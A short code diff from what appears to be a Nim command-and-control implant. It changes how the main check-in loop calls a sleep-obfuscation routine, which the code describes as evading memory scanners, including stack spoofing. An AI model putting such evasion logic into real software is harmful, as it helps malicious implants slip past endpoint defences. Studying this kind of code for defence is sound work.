@@ -31,7 +31,7 @@ proc main() =
     ]#
     while true: 
         # Sleep obfuscation to evade memory scanners
-        sleepObfuscate(ctx.sleep * 1000, ctx.sleepTechnique, ctx.spoofStack)
+        sleepObfuscate(ctx.sleepSettings)
 
         let date: string = now().format("dd-MM-yyyy HH:mm:ss")
         print "\n", fmt"[*] [{date}] Checking in."
